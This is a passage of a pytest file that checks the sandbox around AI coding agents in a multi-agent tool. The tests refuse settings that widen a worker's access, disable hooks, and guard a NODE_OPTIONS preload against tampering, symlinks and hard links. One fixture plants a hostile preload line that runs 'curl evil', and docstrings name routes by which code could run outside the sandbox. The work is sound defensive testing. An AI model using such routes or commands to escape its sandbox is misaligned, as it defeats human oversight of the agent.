    team.spawn("check the login page", "claude", browser=True)
    assert lock_free[0] is True                                                 # spawn's call: teamd's lock was free
    refuse.append(True)
    before = len(lock_free)
    with pytest.raises(lane.LaneRefused, match="no manifest hash is recorded"):
        team.spawn("check the signup page", "claude", browser=True)
    assert lock_free[before:] == [True]                                         # and on the refusing call
    assert list(team.state["workers"]) == ["kaylee"]


def test_settings_that_widen_during_a_turn_stop_it_at_the_next_check(env, lanes, monkeypatch):
    """Review: settings_widenings runs in the 60 s check too, not only when a turn starts."""
    monkeypatch.setenv("MOCK_TURN_SECONDS", "30")
    team, now = browser_team(env)
    team.spawn("check the login page", "claude", browser=True)
    w = team.state["workers"]["kaylee"]
    (env["home"] / ".claude").mkdir()
    (env["home"] / ".claude" / "settings.json").write_text(json.dumps({"permissions": {"allow": ["WebFetch(domain:x.com)"]}}))
    now[0] += 60
    team.monitor_once()
    assert any("LANE STOPPED" in m["message"] and "now widen" in m["message"] for m in team.state["lead_inbox"])
    assert run_until(team, lambda: w["state"] == "failed", timeout=10)


# ---------- Task 9, fix round 1: the advisory flag reads blobs, not diffs, and fails loud ----------

def idle_builder(env):
    team = lane_team(env)
    team.spawn("tidy the cards spec", "claude")
    w = team.state["workers"]["kaylee"]
    assert run_until(team, lambda: w["state"] == "idle")
    return team, w


def commit_files(w, files, message="work"):
    for name, data in files.items():
        f = Path(w["path"]) / name
        f.parent.mkdir(parents=True, exist_ok=True)
        f.write_bytes(data)
    workers.worker_git(w["path"], w["gitdir"], "add", "-A")
    workers.worker_git(w["path"], w["gitdir"], "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", message)


def advisory_flags(team):
    return [m["message"] for m in team.state["lead_inbox"] if "@lane-advisory" in m["message"]]


TAGGED = b"test('card widths @lane-advisory', async () => {});\n"


def test_advisory_added_sees_a_tag_the_diff_would_hide(env):
    team, w = idle_builder(env)
    commit_files(w, {".gitattributes": b"*.spec.ts -diff\n", "a.spec.ts": TAGGED,
                     "nul.spec.ts": b"\0" + TAGGED, "plus.txt": b"++ @lane-advisory\n"})
    found = lane.advisory_added(w["path"], w["base"], w["gitdir"])
    names = sorted(f.split(":")[0] for f in found)
    assert names == ["a.spec.ts", "nul.spec.ts", "plus.txt"], found


def test_a_tag_already_at_base_is_not_flagged_unless_the_count_goes_up(env):
    team = lane_team(env)
    (env["repo"] / "old.spec.ts").write_bytes(TAGGED)
    subprocess.run(["git", "-C", str(env["repo"]), "add", "-A"], check=True)
    subprocess.run(["git", "-C", str(env["repo"]), "commit", "-qm", "tagged"], check=True)
    team.spawn("tidy", "claude")
    w = team.state["workers"]["kaylee"]
    assert run_until(team, lambda: w["state"] == "idle")
    commit_files(w, {"other.ts": b"x\n", "old.spec.ts": TAGGED + b"test('more', () => {});\n"})
    assert lane.advisory_added(w["path"], w["base"], w["gitdir"]) == []
    commit_files(w, {"old.spec.ts": TAGGED + TAGGED})
    found = lane.advisory_added(w["path"], w["base"], w["gitdir"])
    assert len(found) == 1 and found[0].startswith("old.spec.ts: 1 -> 2")


def test_a_git_failure_is_raised_and_told_to_the_lead(env, monkeypatch):
    team, w = idle_builder(env)
    real = subprocess.run

    def broken(argv, *a, **kw):
        if isinstance(argv, list) and "--raw" in argv:
            raise FileNotFoundError("git")
        return real(argv, *a, **kw)
    monkeypatch.setattr(subprocess, "run", broken)
    with pytest.raises(RuntimeError, match="git could not run"):
        lane.advisory_added(w["path"], w["base"], w["gitdir"])
    team.worker_done("kaylee", "tidied", "ok")
    msgs = lead_messages(team, "@lane-advisory CHECK FAILED")
    assert len(msgs) == 1 and "the advisory check failed" in msgs[0]
    monkeypatch.undo()
    with pytest.raises(RuntimeError, match="exited"):
        lane.advisory_added(w["path"], "0" * 40, w["gitdir"])


def test_a_tag_committed_earlier_is_flagged_when_done_commits_nothing(env):
    team, w = idle_builder(env)
    commit_files(w, {"tests/cards.spec.ts": TAGGED})
    team.worker_done("kaylee", "already committed", "ok")
    assert w["commit"] is None
    flags = advisory_flags(team)
    assert len(flags) == 1 and "tests/cards.spec.ts: 0 -> 1" in flags[0]


def test_a_long_advisory_report_says_it_was_cut(env):
    team, w = idle_builder(env)
    long_line = b"x = '" + b"y" * 300 + b" @lane-advisory'\n"
    files = {"f%02d.ts" % n: long_line for n in range(23)}
    commit_files(w, files)
    found = lane.advisory_added(w["path"], w["base"], w["gitdir"])
    assert found[-1] == "… and 3 more" and len(found) == 21
    assert "…" in found[0] and all(len(ln) < 200 for ln in found[0].split("\n"))


def test_a_non_browser_prompt_is_what_it_was_without_a_lane_brief(env, mac, monkeypatch):
    monkeypatch.setattr(teamd.Team, "_fill_slots", lambda self: None)
    team = lane_team(env)
    team.spawn("check the login page", "claude", browser=True)
    team.spawn("write docs", "claude")
    plain = team._initial_prompt("wash")
    w = team.state["workers"]["wash"]
    brief = (teamlib.package_dir() / "roles" / "worker.md").read_text()
    assert plain == ("%s\n\n---\nTeam: %s\nYou are: wash\nTeam goal: %s\nYour worktree (cwd): %s\n"
                     "Your branch: %s\nRepository (read for context): %s\nTeammates: kaylee (claude, build)\n\n"
                     "YOUR TASK:\n%s\n\nContext from the lead:\n%s\n"
                     % (brief, team.team_id, team.state["goal"], w["path"], w["branch"], team.repo, w["task"],
                        w["context"] or "(none)"))


def test_the_lead_hears_about_one_lane_at_a_time_and_the_brief_binds_explicitly():
    lead = (teamlib.package_dir() / "roles" / "lead.md").read_text()
    assert "lane_one_at_a_time" in lead and "idle browser worker holds that lane" in lead
    assert "Never bind 0.0.0.0, ::" in (teamlib.package_dir() / "roles" / "browser-lane.md").read_text()


def test_the_readme_lists_the_bricks_limit():
    readme = (teamlib.package_dir().parent / "README.md").read_text()
    assert "Bricks' specs need the Bricks change before they run in a lane" in readme


# ---------- Task 9, fix round 2: moved tags, one bounded batch, no replace refs ----------

def test_a_tag_moved_within_one_file_is_flagged(env):
    team = lane_team(env)
    (env["repo"] / "m.spec.ts").write_bytes(b"test('a @lane-advisory', () => {});\ntest('b', () => {});\n")
    subprocess.run(["git", "-C", str(env["repo"]), "add", "-A"], check=True)
    subprocess.run(["git", "-C", str(env["repo"]), "commit", "-qm", "tagged"], check=True)
    team.spawn("tidy", "claude")
    w = team.state["workers"]["kaylee"]
    assert run_until(team, lambda: w["state"] == "idle")
    commit_files(w, {"m.spec.ts": b"test('a', () => {});\ntest('b @lane-advisory', () => {});\n"})
    found = lane.advisory_added(w["path"], w["base"], w["gitdir"])
    assert len(found) == 1 and found[0].startswith("m.spec.ts: 1 -> 1") and "test('b @lane-advisory'" in found[0]


def count_git(monkeypatch):
    calls = {"cat-file": 0, "config": 0, "all": 0}
    real = subprocess.run

    def run(argv, *a, **kw):
        if isinstance(argv, list) and argv and argv[0] == "git":
            calls["all"] += 1
            for key in ("cat-file", "config"):
                if key in argv:
                    calls[key] += 1
        return real(argv, *a, **kw)
    monkeypatch.setattr(subprocess, "run", run)
    return calls


def test_many_changed_files_are_read_by_one_cat_file(env, monkeypatch):
    team, w = idle_builder(env)
    commit_files(w, {"f%02d.ts" % n: TAGGED for n in range(30)})
    calls = count_git(monkeypatch)
    assert len(lane.advisory_added(w["path"], w["base"], w["gitdir"])) == 21     # 20 files and "… and 10 more"
    assert calls["cat-file"] == 2 and calls["config"] == 1 and calls["all"] <= 5, calls   # --batch-check, --batch (I2)


def test_a_branch_with_too_many_changes_is_flagged_not_skipped_silently(env, monkeypatch):
    team, w = idle_builder(env)
    monkeypatch.setattr(lane, "ADVISORY_MAX_CHANGED", 5)
    commit_files(w, {"f%02d.ts" % n: b"x\n" for n in range(8)})
    found = lane.advisory_added(w["path"], w["base"], w["gitdir"])
    total = len(workers.worker_git(w["path"], w["gitdir"], "diff", "--name-only", w["base"], "HEAD").stdout.split())
    assert total >= 8
    note = "the advisory check skipped %d files (too many changes); review the tags by hand" % (total - 5)
    assert found == [note]
    team.worker_done("kaylee", "many", "ok")
    assert any(note in m for m in advisory_flags(team))


def test_an_advisory_check_that_times_out_fails_loud(env, monkeypatch):
    team, w = idle_builder(env)
    commit_files(w, {"a.ts": TAGGED})
    real = subprocess.run

    def run(argv, *a, **kw):
        if isinstance(argv, list) and "cat-file" in argv:
            raise subprocess.TimeoutExpired(argv, kw.get("timeout"))
        return real(argv, *a, **kw)
    monkeypatch.setattr(subprocess, "run", run)
    with pytest.raises(RuntimeError, match="timed out"):
        lane.advisory_added(w["path"], w["base"], w["gitdir"])
    team.worker_done("kaylee", "slow", "ok")
    assert len(lead_messages(team, "@lane-advisory CHECK FAILED")) == 1


def test_a_replace_ref_cannot_hide_a_tag(env):
    team, w = idle_builder(env)
    commit_files(w, {"a.spec.ts": TAGGED, "plain.txt": b"nothing here\n"})
    blobs = {n: workers.worker_git(w["path"], w["gitdir"], "rev-parse", "HEAD:" + n).stdout.strip()
             for n in ("a.spec.ts", "plain.txt")}
    workers.worker_git(w["path"], w["gitdir"], "replace", blobs["a.spec.ts"], blobs["plain.txt"])
    found = lane.advisory_added(w["path"], w["base"], w["gitdir"])
    assert [f.split(":")[0] for f in found] == ["a.spec.ts"]


# ---------- Final fix wave: C1, the lane's environment outside the sandbox ----------

def preload_bytes():
    return (teamlib.package_dir() / "lane" / "preload.cjs").read_bytes()


def test_a_browser_worker_starts_with_strict_mcp_config_and_hooks_off(env, monkeypatch):
    """C1: everything claude starts outside its sandbox inherits the lane's environment, so a browser worker loads only
    teamd's own MCP config (--strict-mcp-config) and no hooks (disableAllHooks in its flag settings, which outrank
    project and local settings)."""
    monkeypatch.setenv("HOME", "/home/u")
    path = "/tmp/sy-lane-%d/0123456789" % os.getuid()
    preload = "/home/u/.superyak/team/teams/t1/workers/kaylee/lane-preload.cjs"
    plain = workers.claude_command(dict(teamlib.DEFAULT_CONFIG), "t1", "wash", "/r/wt", "go", repo="/r/repo")
    cmd = workers.claude_command(dict(teamlib.DEFAULT_CONFIG), "t1", "kaylee", "/r/wt", "go", repo="/r/repo", lane=path,
                                 preload=preload)
    wdir = teamlib.team_dir("t1") / "workers" / "kaylee"
    assert cmd == [c.replace("/wash/", "/kaylee/") for c in plain] + ["--strict-mcp-config"]
    assert cmd[cmd.index("--mcp-config") + 1] == str(wdir / "mcp.json")
    written = json.loads((wdir / "settings.json").read_text())
    assert written["disableAllHooks"] is True
    before = workers.claude_sandbox_settings("/r/wt", "build", False, repo="/r/repo")
    assert set(written) - set(before) == {"disableAllHooks"}
    assert "disableAllHooks" not in json.loads((teamlib.team_dir("t1") / "workers" / "wash" / "settings.json").read_text())


def test_a_non_browser_worker_is_byte_for_byte_what_it_was(env, monkeypatch):
    """C1: the lane's additions are the lane's only. The snapshots were taken from the code before lanes existed."""
    monkeypatch.setenv("HOME", "/home/u")
    cmd = workers.claude_command(dict(teamlib.DEFAULT_CONFIG), "t1", "wash", "/r/wt", "go", repo="/r/repo")
    assert "--strict-mcp-config" not in cmd
    settings = (teamlib.team_dir("t1") / "workers" / "wash" / "settings.json").read_text()
    assert json.dumps(json.loads(settings), indent=1) + "\n" == (SNAPSHOTS / "settings-build.json").read_text()


def test_node_options_names_teamds_own_preload_never_one_under_tmp(env, lanes):
    """C1, path 2: a preload under /tmp can be replaced by anything that can write /tmp (a Codex worker), and every node
    process outside the sandbox that inherits NODE_OPTIONS would require it. It is teamd's own file now, in its worker
    folder, at mode 0644, and the worker may read it."""
    team, now = browser_team(env)
    team.spawn("check the login page", "claude", browser=True)
    w = team.state["workers"]["kaylee"]
    options = lanes["launched"][0]["env"]["NODE_OPTIONS"]
    preload = teamlib.team_dir("t1") / "workers" / "kaylee" / "lane-preload.cjs"
    assert options == '--require "%s"' % preload and w["lane"]["preload"] == str(preload)
    named = Path(options.split('"')[1])
    assert lane.TMP_ROOT not in named.parents and Path(os.path.realpath(lane.TMP_ROOT)) not in Path(os.path.realpath(named)).parents
    assert named.read_bytes() == preload_bytes() and stat_mode(os.lstat(named)) == 0o644
    assert not (lane.lane_path("t1", "kaylee") / "preload.cjs").exists()
    settings = json.loads((team.dir / "workers" / "kaylee" / "settings.json").read_text())
    assert str(preload) in settings["sandbox"]["filesystem"]["allowRead"]
    assert str(preload) not in settings["sandbox"]["filesystem"]["allowWrite"]
    assert "--strict-mcp-config" in lanes["launched"][0]["cmd"] and settings["disableAllHooks"] is True


def test_the_preload_is_written_at_0644_whatever_the_umask_and_rewritten_only_when_wrong(env):
    old = os.umask(0o077)
    try:
        path = lane.ensure_preload("t1", "kaylee")
    finally:
        os.umask(old)
    assert path == teamlib.team_dir("t1") / "workers" / "kaylee" / "lane-preload.cjs"
    assert stat_mode(os.lstat(path)) == 0o644 and path.read_bytes() == preload_bytes()
    inode = os.lstat(path).st_ino
    assert lane.ensure_preload("t1", "kaylee") == path and os.lstat(path).st_ino == inode        # right: left alone
    path.write_bytes(b"require('child_process').exec('curl evil')\n")
    lane.ensure_preload("t1", "kaylee")
    assert path.read_bytes() == preload_bytes()
    os.chmod(path, 0o666)
    lane.ensure_preload("t1", "kaylee")
    assert stat_mode(os.lstat(path)) == 0o644


def test_a_preload_name_swapped_for_a_hard_link_is_replaced_never_written_through(env):
    victim = env["home"] / ".zshrc"
    victim.write_text("export SECRET=1\n")
    path = lane.ensure_preload("t1", "kaylee")
    path.unlink()
    os.link(victim, path)
    lane.ensure_preload("t1", "kaylee")
    assert victim.read_text() == "export SECRET=1\n" and os.stat(path).st_ino != os.stat(victim).st_ino
    assert path.read_bytes() == preload_bytes()


@pytest.mark.parametrize("case", ["symlink", "someone else's", "group-writable folder", "world-writable folder",
                                  "folder is a symlink"])
def test_the_preload_is_refused_when_it_isnt_teamds_own(env, monkeypatch, case):
    """C1: refused when it is a symlink, when someone else owns it, or when its folder is group- or world-writable;
    nothing is written through it."""
    path = lane.ensure_preload("t1", "kaylee")
    victim = env["home"] / "victim.cjs"
    victim.write_text("mine\n")
    if case == "symlink":
        path.unlink()
        os.symlink(victim, path)
    elif case == "someone else's":
        real_lstat, mine = os.lstat, os.getuid()

        class Theirs:
            def __init__(self, st):
                self._st = st

            def __getattr__(self, name):
                return mine + 1 if name == "st_uid" else getattr(self._st, name)
        monkeypatch.setattr(lane.os, "lstat", lambda p, *a, **k: Theirs(real_lstat(p, *a, **k)) if str(p) == str(path)
                            else real_lstat(p, *a, **k))
    elif case == "group-writable folder":
        os.chmod(path.parent, 0o770)
    elif case == "world-writable folder":
        os.chmod(path.parent, 0o707)
    else:
        real = env["tmp"] / "elsewhere"
        shutil.move(str(path.parent), str(real))
        os.symlink(real, path.parent)
    reason = {"symlink": "isn't a plain file", "someone else's": "belongs to another user",
              "group-writable folder": "writable by someone other than its owner",
              "world-writable folder": "writable by someone other than its owner",
              "folder is a symlink": "isn't a folder of yours"}[case]
    with pytest.raises(lane.LaneRefused, match=reason):
        lane.ensure_preload("t1", "kaylee")
    assert victim.read_text() == "mine\n"
    if case.endswith("folder"):
        os.chmod(path.parent, 0o700)


def test_a_preload_folder_above_that_others_can_write_is_refused(env):
    lane.ensure_preload("t1", "kaylee")
    above = teamlib.team_dir("t1")
    os.chmod(above, 0o777)
    try:
        with pytest.raises(lane.LaneRefused, match="writable by someone other than its owner"):
            lane.ensure_preload("t1", "kaylee")
    finally:
        os.chmod(above, 0o755)


def test_a_preload_under_a_shared_temp_folder_is_refused(env, monkeypatch):
    """With the real UNSAFE_ROOTS: the tests' team home is under the system's temp folder (/tmp on the Pi), as a
    SUPERYAK_TEAM_HOME there, or a symlink into it, would be; the preload must never live there."""
    real = os.path.realpath(env["tmp"])
    roots = ("/private/tmp", "/tmp", "/private/var/folders")
    if not any(real == r or real.startswith(r + os.sep) for r in roots):
        pytest.skip("this machine's test folders aren't under a shared temp folder")
    monkeypatch.setattr(lane, "UNSAFE_ROOTS", roots)
    with pytest.raises(lane.LaneRefused, match="under the shared temp folder"):
        lane.ensure_preload("t1", "kaylee")


def test_a_preload_path_node_options_cant_quote_is_refused():
    assert lane.node_require('/Users/A B/x.cjs') == '--require "/Users/A B/x.cjs"'
    for bad in ('/a"b/x.cjs', "/a\\b/x.cjs", "/a\nb/x.cjs"):
        with pytest.raises(lane.LaneRefused, match="can't quote"):
            lane.node_require(bad)


@pytest.mark.skipif(not shutil.which("node"), reason="needs node")
def test_node_takes_the_quoted_preload_from_node_options(tmp_path):
    """The preload's new home may hold a space; node reads NODE_OPTIONS's quoted --require."""
    folder = tmp_path / "home with space"
    folder.mkdir()
    (folder / "lane-preload.cjs").write_bytes(preload_bytes())
    script = "const s = require('net').createServer().listen(0, () => { console.log(s.address().address); s.close(); })"
    r = subprocess.run(["node", "-e", script], capture_output=True, text=True, timeout=30,
                       env=dict(os.environ, NODE_OPTIONS=lane.node_require(folder / "lane-preload.cjs")))
    assert r.returncode == 0 and r.stdout.strip() == "127.0.0.1", r.stderr


def test_the_worker_env_turns_claudes_own_updater_off(env):
    """C1: claude's auto-updater runs outside the sandbox and, for an npm install, would use the lane's
    npm_config_cache, which the worker can write."""
    extra = lane.worker_env("/tmp/sy-lane-1/0123456789", 41000, "ws://x", "/h/lane-preload.cjs")
    assert extra["DISABLE_AUTOUPDATER"] == "1" and extra["npm_config_cache"] == "/tmp/sy-lane-1/0123456789/npm-cache"


def test_managed_hooks_refuse_a_lane(env, mac):
    """C1: Claude Code runs a managed policy's hooks even under a non-managed disableAllHooks, outside the sandbox and
    with the lane's environment. User and local hooks are switched off by the lane's flag settings, so only managed
    ones refuse."""
    hook = {"SessionStart": [{"hooks": [{"type": "command", "command": "npx something"}]}]}
    claude_dir = env["home"] / ".claude"
    claude_dir.mkdir()
    (claude_dir / "settings.json").write_text(json.dumps({"hooks": hook}))
    assert lane.settings_widenings() == []
    lane.MANAGED_SETTINGS.write_text(json.dumps({"hooks": hook}))
    assert lane.settings_widenings() == ["%s defines hooks, which Claude Code runs outside the sandbox with the lane's "
                                         "environment even under disableAllHooks" % lane.MANAGED_SETTINGS]
    lane.MANAGED_SETTINGS.write_text(json.dumps({"hooks": {}}))
    assert lane.settings_widenings() == []


# ---------- Final fix wave: I1, the settings check is an allowlist and fails closed ----------

@pytest.mark.parametrize("name, data, refused", [
    ("settings.json", {"sandbox": {"network": {"allowUnixSockets": ["/"]}}}, "adds sandbox.network.allowUnixSockets"),
    ("settings.json", {"sandbox": {"network": {"allowAllUnixSockets": True}}}, "adds sandbox.network.allowAllUnixSockets"),
    ("settings.local.json", {"sandbox": {"network": {"allowMachLookup": ["*"]}}}, "adds sandbox.network.allowMachLookup"),
    ("managed", {"sandbox": {"network": {"allowAllUnixSockets": True}}}, "adds sandbox.network.allowAllUnixSockets"),
    ("settings.json", {"sandbox": {"network": {"httpProxyPort": 8080}}}, "adds sandbox.network.httpProxyPort"),
    ("settings.json", {"sandbox": {"network": {"allowedDomains": ["github.com"]}}}, "adds sandbox.network.allowedDomains"),
    ("settings.json", {"sandbox": {"network": {"a key\nthat names\nlines": 1}}}, "adds a sandbox key this check doesn't know"),
    ("settings.json", {"sandbox": "on"}, "can't be read (its sandbox isn't an object)"),
    ("settings.json", {"sandbox": {"network": ["allowAllUnixSockets"]}}, "can't be read (its sandbox.network isn't an object)"),
    ("settings.json", {"permissions": "WebFetch"}, "can't be read (its permissions isn't an object)"),
    ("settings.json", {"permissions": {"allow": "WebFetch"}}, "can't be read (its permissions.allow isn't a list)"),
    ("settings.json", {"permissions": {"allow": [{"tool": "WebFetch"}]}}, "can't be read (its permissions.allow holds a rule that isn't a string)"),
    ("settings.json", {"permissions": {"allow": ["WebFetch"]}}, "allows WebFetch"),
    ("settings.json", {"permissions": {"allow": ["WebFetch(https://example.com/*)"]}}, "allows WebFetch"),
    ("settings.local.json", {"permissions": {"allow": ["WebFetch(domain:example.com)"]}}, "allows WebFetch"),
    ("settings.json", {"sandbox": {"network": {"allowedDomains": []}}}, None),
    ("settings.json", {"sandbox": {"network": {"allowLocalBinding": False, "allowedDomains": []}}},
     "adds sandbox.network.allowLocalBinding"),
    ("settings.json", {"sandbox": {"enabled": True}, "permissions": {"allow": ["Bash(npm test)", "WebSearch"]}},
     "adds sandbox.enabled"),
    ("settings.json", {"sandbox": {}, "permissions": {"allow": ["Bash(npm test)", "WebSearch"]}}, None),
])
def test_settings_that_could_widen_a_lane_refuse_it(env, name, data, refused):
    """I1: any non-empty sandbox.network key in user or managed settings refuses (allowUnixSockets, allowAllUnixSockets
    and allowMachLookup among them), except an empty allowedDomains; any WebFetch allow rule widens; a value of the
    wrong shape is unreadable, so refused. A key the file names is only quoted when it is a plain word."""
    path = lane.MANAGED_SETTINGS if name == "managed" else env["home"] / ".claude" / name
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(data))
    found = lane.settings_widenings()
    if refused is None:
        assert found == []
    else:
        assert len(found) == 1 and found[0] == "%s %s" % (path, refused), found
        assert "\n" not in found[0]


@pytest.mark.parametrize("damage", ["oserror", "not an object", "not a directory", "not utf-8"])
def test_a_settings_file_that_cant_be_read_refuses_a_lane(env, damage):
    """I1 (Task 1's items): an unreadable file, JSON that isn't an object, a settings folder that is a file, and bytes
    that aren't UTF-8 each refuse, never pass and never raise."""
    claude_dir = env["home"] / ".claude"
    if damage == "not a directory":
        claude_dir.write_text("a file where the folder should be")
        found = lane.settings_widenings()
        assert len(found) == 2 and all("can't be read (NotADirectoryError)" in f for f in found)
        return
    claude_dir.mkdir()
    path = claude_dir / "settings.json"
    if damage == "oserror":
        path.write_text("{}")
        path.chmod(0)
        if os.access(path, os.R_OK):
            pytest.skip("running as a user who can read anything")
    elif damage == "not an object":
        path.write_text(json.dumps(["sandbox"]))
    else:
        path.write_bytes(b'{"sandbox": "\xff"}')
    try:
        found = lane.settings_widenings()
    finally:
        path.chmod(0o600)
    reason = {"oserror": "can't be read (PermissionError)", "not an object": "isn't a JSON object",
              "not utf-8": "can't be read (UnicodeDecodeError)"}[damage]
    assert found == ["%s %s" % (path, reason)]


# ---------- Final fix wave: I2 and T9, the advisory check ----------

def git_calls(monkeypatch):
    """Every git argv subprocess.run is given, with its stdin, from here on."""
    calls = []
    real = subprocess.run

    def run(argv, *a, **kw):
        if isinstance(argv, list) and argv and argv[0] == "git":
            calls.append((list(argv), kw.get("input")))
        return real(argv, *a, **kw)
    monkeypatch.setattr(subprocess, "run", run)
    return calls


def test_a_non_lane_teams_done_runs_no_advisory_git(env, monkeypatch):
    """I2 (ruling): the advisory check is for browser_lane teams only, so a team without lanes is as it was."""
    team = lane_team(env, browser_lane=False)
    team.spawn("tidy the cards spec", "claude")
    w = team.state["workers"]["kaylee"]
    assert run_until(team, lambda: w["state"] == "idle")
    commit_files(w, {"tests/cards.spec.ts": TAGGED})
    calls = git_calls(monkeypatch)
    team.worker_done("kaylee", "tidied", "ok")
    assert not [argv for argv, _ in calls if "cat-file" in argv or "--raw" in argv], calls
    assert advisory_flags(team) == []


def test_a_blob_over_a_megabyte_is_skipped_and_reported(env, monkeypatch):
    """I2: git cat-file --batch-check first; a blob over 1 MB is never read, and the lead hears it was skipped."""
    team, w = idle_builder(env)
    big = b"x" * (1 << 20) + b"\n" + TAGGED
    commit_files(w, {"big.spec.ts": big, "small.spec.ts": TAGGED})
    calls = git_calls(monkeypatch)
    found = lane.advisory_added(w["path"], w["base"], w["gitdir"])
    big_sha = workers.worker_git(w["path"], w["gitdir"], "rev-parse", "HEAD:big.spec.ts").stdout.strip()
    assert found[0].startswith("small.spec.ts: 0 -> 1")
    assert found[-1] == ("the advisory check skipped big.spec.ts (%d bytes, over 1 MB); review its tags by hand"
                         % len(big))
    checks = [stdin for argv, stdin in calls if "--batch-check" in argv]
    reads = [stdin for argv, stdin in calls if "--batch" in argv]
    assert len(checks) == 1 and big_sha.encode() in checks[0]
    assert len(reads) == 1 and big_sha.encode() not in reads[0]
    team.worker_done("kaylee", "big", "ok")
    assert any("skipped big.spec.ts" in m for m in advisory_flags(team))


def test_the_batch_reader_is_not_fooled_by_a_header_lookalike_line(env):
    """T9: a blob holding a line shaped like cat-file's own header is read by its size, not by its lines."""
    team, w = idle_builder(env)
    lookalike = b"%s blob 999\n" % (b"a" * 40) + TAGGED + b"%s blob 3\nxyz\n" % (b"b" * 40)
    commit_files(w, {"a.spec.ts": lookalike, "b.spec.ts": TAGGED + TAGGED})
    found = lane.advisory_added(w["path"], w["base"], w["gitdir"])
    assert [f.split("\n")[0] for f in found] == ["a.spec.ts: 0 -> 1 occurrences", "b.spec.ts: 0 -> 2 occurrences"]


def test_a_short_read_from_cat_file_is_an_error():
    """T9: output cut short (or not ended by its newline) is never taken for the blob."""
    sha = "c" * 40
    with pytest.raises(RuntimeError, match="cut short"):
        lane._cat_file_batch(b"%s blob 10\nabc" % sha.encode(), [sha])
    with pytest.raises(RuntimeError, match="cut short"):
        lane._cat_file_batch(b"%s blob 3\nabcX" % sha.encode(), [sha])
    assert lane._cat_file_batch(b"%s blob 3\nabc\n" % sha.encode(), [sha]) == {sha: b"abc"}


def test_worker_git_and_the_advisory_check_share_one_hardened_argv(env, monkeypatch):
    """T9: worker_git_argv is the one place teamd's hardened git for a worker's folder is built."""
    team, w = idle_builder(env)
    commit_files(w, {"a.spec.ts": TAGGED})
    expected = workers.worker_git_argv(w["path"], w["gitdir"])
    assert expected[:5] == ["git", "--git-dir", w["gitdir"], "--work-tree", w["path"]]
    assert expected[5:5 + len(workers.HARDENED_GIT)] == workers.HARDENED_GIT
    calls = git_calls(monkeypatch)
    workers.worker_git(w["path"], w["gitdir"], "status")
    lane.advisory_added(w["path"], w["base"], w["gitdir"])
    hardened = [argv for argv, _ in calls if argv[:2] == ["git", "--git-dir"] and "--work-tree" in argv]
    assert hardened[0] == expected + ["status"]
    assert all(argv[:len(expected) + 1] == expected + ["--no-replace-objects"] for argv in hardened[1:])
    assert len(hardened) >= 3


# ---------- Final fix wave: T3, T5, T7, T8 ----------

def test_the_lanes_deny_read_root_comes_from_tmp_root(env, tmp_root):
    """T3: /tmp/sy-lane-<uid> comes from lane.TMP_ROOT, never from the lane path it was handed."""
    settings = workers.claude_sandbox_settings("/r/wt", "build", False, repo="/r/repo",
                                               lane="/elsewhere/sy-lane-x/0123456789", preload="/h/p.cjs")
    deny = settings["sandbox"]["filesystem"]["denyRead"]
    assert str(tmp_root / ("sy-lane-%d" % os.getuid())) in deny and "/elsewhere/sy-lane-x" not in deny


def test_drop_env_comes_before_env_extra(env, monkeypatch, tmp_path):
    """T3: a variable env_extra sets is the agent's even when drop_env names it."""
    seen = []
    monkeypatch.setattr(workers.subprocess, "Popen", lambda cmd, **kw: seen.append(kw["env"]))
    monkeypatch.setenv("NODE_OPTIONS", "--require /teamd/own.cjs")
    workers.launch(["claude"], tmp_path, tmp_path / "w", {"NODE_OPTIONS": "--require /lane.cjs"},
                   drop_env=("NODE_OPTIONS",))
    assert seen[0]["NODE_OPTIONS"] == "--require /lane.cjs"


def test_the_broker_root_under_a_shared_temp_folder_is_refused_with_the_real_unsafe_roots(env, monkeypatch, tmp_path):
    """T5: with the real UNSAFE_ROOTS, a team home in the system's temp folder is refused, and so is one reached through
    a symlink (a relative SUPERYAK_TEAM_HOME whose literal path names no temp folder at all)."""
    roots = ("/private/tmp", "/tmp", "/private/var/folders")
    real = os.path.realpath(tmp_path)
    if not any(real == r or real.startswith(r + os.sep) for r in roots):
        pytest.skip("this machine's test folders aren't under a shared temp folder")
    monkeypatch.setattr(lane, "UNSAFE_ROOTS", roots)
    with pytest.raises(lane.LaneRefused, match="under the shared temp folder"):
        lane.broker_root()
    (tmp_path / "real-home").mkdir()
    os.symlink(tmp_path / "real-home", tmp_path / "linked-home")
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("SUPERYAK_TEAM_HOME", "linked-home")
    assert not str(teamlib.team_home()).startswith(roots)
    with pytest.raises(lane.LaneRefused, match="under the shared temp folder"):
        lane.broker_root()


def test_a_stamp_that_is_a_fifo_is_refused_without_blocking(env, unpack):
    """T5: the stamps are opened O_NONBLOCK, so a FIFO planted as one can't hang teamd's install lock."""
    tarball = npm_tarball(PW_FILES)
    base = commit_lockfile(env["repo"], {"version": "1.55.0", "integrity": sri(tarball)})
    dest = lane.pinned_playwright(env["repo"], base, Registry(tarball))
    stamp = dest / lane.STAMP
    stamp.unlink()
    os.mkfifo(stamp, 0o600)
    errors = []

    def run():
        try:
            lane.pinned_playwright(env["repo"], base, Registry(tarball))
        except Exception as e:
            errors.append(e)
    t = threading.Thread(target=run, daemon=True)
    t.start()
    t.join(5)
    blocked = t.is_alive()
    if blocked:                                                         # release the reader the old code left waiting
        os.close(os.open(stamp, os.O_WRONLY | os.O_NONBLOCK))
        t.join(5)
    assert not blocked, "reading a FIFO stamp blocked"
    assert len(errors) == 1 and "isn't a plain file" in str(errors[0])


class StartFails:
    """A Popen for start_broker whose broker prints nothing and exits; it records when it is polled."""
    order = []

    def __init__(self, cmd, **kw):
        self.pid, self.stdin, self.stdout = 2 ** 22 + 4321, io.StringIO(), io.StringIO("")

    def poll(self):
        StartFails.order.append("poll")
        return 1


def test_a_failed_start_walks_the_brokers_family_before_it_polls(broker_parts, monkeypatch):
    """T7: poll() can reap the broker, and its pid may then be reused: its family is taken first."""
    StartFails.order = []
    monkeypatch.setattr(lane.subprocess, "Popen", StartFails)
    monkeypatch.setattr(lane, "family", lambda pid: (StartFails.order.append("family"), (set(), set()))[1])
    monkeypatch.setattr(lane, "stop_broker", lambda broker: None)
    monkeypatch.setattr(lane, "cleanup_processes", lambda path, base, broker=None, env=None: True)
    with pytest.raises(lane.LaneRefused, match="exited"):
        start(broker_parts)
    assert StartFails.order[:2] == ["family", "poll"], StartFails.order


@pytest.mark.parametrize("table, rc", [("", 0), ("%d 1 %d %d\n" % (os.getpid(), os.getpid(), os.getuid()), 1)])
